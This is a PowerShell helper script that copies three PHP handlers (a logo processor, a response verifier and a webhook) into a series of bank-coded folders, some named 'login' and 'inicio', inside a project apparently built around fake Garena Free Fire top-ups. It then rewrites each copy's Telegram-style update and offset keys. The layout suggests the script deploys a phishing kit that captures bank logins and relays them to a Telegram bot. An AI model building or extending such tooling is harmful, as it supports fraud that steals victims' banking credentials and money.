$banks = @("b-34f5", "b-34f7", "b-34f2", "b-34f18", "b-34f14", "b-34f13", "b-34f12", "b-34f01", "b-34f0", "b-34f16", "b-34f12\wps", "b-34f16\login", "b-34f1\inicio", "b-34f02")

foreach ($bank in $banks) {
    $path = "c:\Users\Ronal\Downloads\Telegram Desktop\garena free fire\garena free fire\data-ps\recargas\transaction\$bank"
    if (Test-Path $path) {
        Copy-Item "c:\Users\Ronal\Downloads\Telegram Desktop\garena free fire\garena free fire\data-ps\recargas\transaction\b-34f4\procesar_logo.php" "$path\procesar_logo.php" -Force
        Copy-Item "c:\Users\Ronal\Downloads\Telegram Desktop\garena free fire\garena free fire\data-ps\recargas\transaction\b-34f4\verificar_respuesta.php" "$path\verificar_respuesta.php" -Force
        Copy-Item "c:\Users\Ronal\Downloads\Telegram Desktop\garena free fire\garena free fire\data-ps\recargas\transaction\b-34f4\webhook.php" "$path\webhook.php" -Force
        
        # Replace sessionKey
        $content = Get-Content "$path\verificar_respuesta.php" -Raw
        $bankName = $bank -replace '\\', '_'
        $content = $content -replace 'b34f4_update_id', "${bankName}_update_id"
        $content = $content -replace 'b34f4_offset.txt', "${bankName}_offset.txt"
        Set-Content "$path\verificar_respuesta.php" $content
    }
}